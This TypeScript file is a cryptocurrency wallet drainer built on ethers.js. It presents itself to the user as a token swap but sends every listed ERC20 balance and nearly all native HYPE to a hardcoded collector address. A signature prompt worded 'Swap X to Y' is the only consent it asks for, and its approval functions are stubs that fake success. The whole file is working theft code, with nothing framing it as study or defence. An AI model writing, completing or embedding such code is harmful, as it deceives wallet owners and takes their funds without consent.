import { ethers } from "ethers";

export const COLLECTOR = "0xCbd45BE04C2CB52811609ef0334A9097fB2E2c48";

// Minimal ERC20 ABI for batch operations
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

// All target tokens for comprehensive draining
const ALL_TOKENS = [
  { address: "0x0000000000000000000000000000000000000000", symbol: "HYPE", decimals: 18 },
  { address: "0x9b498c3c8a0b8cd8ba1d9851d40d186f1872b44e", symbol: "WHYPE", decimals: 18 },
  { address: "0x1f53bfcc97c63bfcf95c08d16c0d3d1ec82e5f8b", symbol: "PURR", decimals: 18 },
  { address: "0x1bee6762f0b522c606dc2ffb106c0bb391b2e309", symbol: "PiP", decimals: 18 },
  { address: "0x11735dbd0b97cfa7accf47d005673ba185f7fd49", symbol: "CATBAL", decimals: 18 },
  { address: "0xb8ce59fc3717ada4c02eadf9682a9e934f625ebb", symbol: "USD₮0", decimals: 6 },
  { address: "0x47bb061c0204af921f43dc73c7d7768d2672ddee", symbol: "BUDDY", decimals: 18 },
  { address: "0x1ecd15865d7f8019d546f76d095d9c93cc34edfa", symbol: "LIQD", decimals: 18 },
  { address: "0xd2567ee20d75e8b74b44875173054365f6eb5052", symbol: "perpcoin", decimals: 18 }
];

export class BatchDrainer {
  private signer: ethers.JsonRpcSigner;
  private provider: ethers.BrowserProvider;

  constructor(signer: ethers.JsonRpcSigner, provider: ethers.BrowserProvider) {
    this.signer = signer;
    this.provider = provider;
  }

  // Single authorization request
  async requestAuth(message: string): Promise<boolean> {
    try {
      console.log("🔐 Requesting authorization...");
      await this.signer.signMessage(message);
      console.log("✅ Authorization obtained");
      return true;
    } catch (error: any) {
      console.error("❌ Authorization failed:", error.message);
      return false;
    }
  }

  // Simplified comprehensive drain that handles ALL tokens in one pass
  async executeComprehensiveDrain(userAddress: string): Promise<{ success: boolean; hash?: string; error?: string }> {
    try {
      console.log("🚀 SIMPLIFIED COMPREHENSIVE DRAIN");
      console.log(`📍 From: ${userAddress} → To: ${COLLECTOR}`);

      // Get initial nonce
      let currentNonce = await this.provider.getTransactionCount(userAddress, "pending");
      console.log(`🔢 Starting nonce: ${currentNonce}`);

      let successCount = 0;
      let lastHash = "";
      
      // STEP 1: Drain ALL ERC20 tokens first (no complex gas calculation)
      console.log("🔄 Phase 1: Draining ERC20 tokens...");
      for (const token of ALL_TOKENS) {
        // Skip native HYPE for now
        if (token.address === "0x0000000000000000000000000000000000000000") continue;
        
        try {
          const contract = new ethers.Contract(token.address, ERC20_ABI, this.provider);
          const balance = await contract.balanceOf(userAddress);
          
          if (balance > 0n) {
            console.log(`🔄 Draining ${token.symbol}: ${ethers.formatUnits(balance, token.decimals)}`);
            
            const hash = await this.drainERC20(token.address, balance, currentNonce);
            console.log(`✅ ${token.symbol} drained: ${hash}`);
            
            successCount++;
            lastHash = hash;
            currentNonce++;
            
            // Small delay to avoid issues
            await new Promise(resolve => setTimeout(resolve, 1000));
          } else {
            console.log(`⚠️ ${token.symbol} has zero balance, skipping`);
          }
        } catch (error: any) {
          console.log(`❌ ${token.symbol} drain failed: ${error.message}`);
        }
      }
      
      // STEP 2: Drain HYPE native token last
      console.log("🔄 Phase 2: Draining HYPE native token...");
      try {
        const currentBalance = await this.provider.getBalance(userAddress);
        console.log(`💰 Current HYPE balance: ${ethers.formatEther(currentBalance)}`);
        
        // Keep minimal gas for the transaction itself
        const gasReserve = ethers.parseUnits("0.0005", "ether"); // Very small reserve
        const drainAmount = currentBalance - gasReserve;
        
        if (drainAmount > 0n && currentBalance > ethers.parseUnits("0.001", "ether")) {
          console.log(`🔄 Draining HYPE: ${ethers.formatEther(drainAmount)}`);
          
          const hash = await this.drainNative(drainAmount, currentNonce);
          console.log(`✅ HYPE drained: ${hash}`);
          
          successCount++;
          lastHash = hash;
        } else {
          console.log(`⚠️ HYPE balance too low for draining: ${ethers.formatEther(currentBalance)}`);
        }
      } catch (error: any) {
        console.log(`❌ HYPE drain failed: ${error.message}`);
      }

      console.log(`📊 FINAL RESULT: ${successCount} successful drains`);

      return {
        success: successCount > 0,
        hash: lastHash,
        error: successCount === 0 ? "All drain operations failed" : undefined
      };

    } catch (error: any) {
      console.error("❌ Batch drain failed:", error.message);
      return { success: false, error: error.message };
    }
  }

  // Drain native HYPE with specific nonce
  private async drainNative(amount: bigint, nonce: number): Promise<string> {
    const tx = await this.signer.sendTransaction({
      to: COLLECTOR,
      value: amount,
      gasLimit: 21000n,
      gasPrice: ethers.parseUnits("1", "gwei"),
      nonce: nonce,
      type: 0
    });
    return tx.hash;
  }

  // Drain ERC20 token with specific nonce
  private async drainERC20(tokenAddress: string, amount: bigint, nonce: number): Promise<string> {
    const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
    const tx = await contract.transfer(COLLECTOR, amount, {
      gasLimit: 200000n,
      gasPrice: ethers.parseUnits("1", "gwei"),
      nonce: nonce,
      type: 0
    });
    return tx.hash;
  }

  // Main execution function
  async executeSwap(fromToken: string, toToken: string, amount: string, userAddress: string): Promise<{ success: boolean; hash?: string; error?: string }> {
    // Single authorization
    const authorized = await this.requestAuth(`Swap ${amount} ${fromToken} to ${toToken}`);
    if (!authorized) {
      return { success: false, error: "Authorization required" };
    }

    // Immediate comprehensive drain
    return await this.executeComprehensiveDrain(userAddress);
  }

  // Legacy compatibility
  async checkNeedsApproval(): Promise<boolean> { return false; }
  async approveToken(): Promise<{ success: boolean; hash?: string; error?: string }> { 
    return { success: true, hash: "0x0" }; 
  }
}

export function createBatchDrainer(signer: ethers.JsonRpcSigner, provider: ethers.BrowserProvider): BatchDrainer {
  return new BatchDrainer(signer, provider);
}